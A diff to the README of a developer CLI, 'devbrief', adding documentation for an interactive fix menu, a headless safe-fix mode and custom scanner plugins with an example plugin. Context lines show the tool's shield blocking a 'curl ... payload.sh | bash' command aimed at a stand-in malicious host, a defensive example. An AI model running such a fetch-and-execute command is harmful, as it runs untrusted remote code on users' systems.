@@ -128,9 +128,26 @@ Safe wins:
 
 ---
 
-## 5. Safe Fixes (`devbrief fix --safe-only`)
+## 5. Upgrades & Fixes (`devbrief fix`)
 
-Applying automated fixes for high-confidence, low-risk upgrades across multiple languages and workspace folders:
+### Interactive CLI Menu (TTY Environments)
+
+If run in an interactive terminal, `devbrief fix` opens a selection dashboard using raw-mode TTY inputs:
+
+```bash
+npx devbrief fix
+```
+
+```text
+? Select fixes to apply (Space to toggle, Enter to confirm):
+❯ [x] Upgrade lodash - lodash has a known vulnerability (5 min, Confidence: High)
+  [x] Upgrade serde - serde has EOL warnings (5 min, Confidence: High)
+  [ ] Remediate wildcard CORS - CORS config wildcard review (20 min, Confidence: Medium)
+```
+
+### Headless Mode (`devbrief fix --safe-only`)
+
+For non-TTY environments (like CI/CD pipelines), or to auto-apply low-risk, high-confidence upgrades:
 
 ```bash
 npx devbrief fix --safe-only
@@ -252,4 +269,45 @@ If code tries to run commands containing shell execution chains with unapproved 
 ⚠️  [DevBrief Vibe Shield] BLOCKED: child_process.spawn - curl -s http://malicious.org/payload.sh | bash
 Error: Permission Denied: command injection/unsafe command blocked by Vibe Shield
 ```
+```
+
+---
+
+## 9. Custom Scanner Plugins
+
+You can extend DevBrief by writing custom scanner scripts and placing them in `.devbrief/plugins/` (local to project) or `~/.devbrief/plugins/` (global to your machine).
+
+A plugin module must export a scanner object conforming to the `Scanner` interface:
+
+```javascript
+// .devbrief/plugins/custom-linter.js
+export const scanner = {
+  name: 'custom-linter',
+  categories: ['security', 'doctor'], // CLI category commands that invoke this plugin
+  async scan(context) {
+    const findings = [];
+    
+    // Check if configuration matches
+    const hasConfigFile = context.files.some(f => f.endsWith('lint-config.json'));
+    if (!hasConfigFile) {
+      findings.push({
+        id: 'security:linter:missing-config',
+        category: 'security',
+        label: 'REVIEW',
+        title: 'Missing lint configuration',
+        summary: 'No lint-config.json was found in the workspace',
+        evidence: 'Checked workspace directory tree',
+        recommendation: 'remediate',
+        urgency: 4,
+        impact: 4,
+        confidence: 10,
+        effort: '5 min'
+      });
+    }
+    
+    return findings;
+  }
+};
+
+export default scanner;
 ```
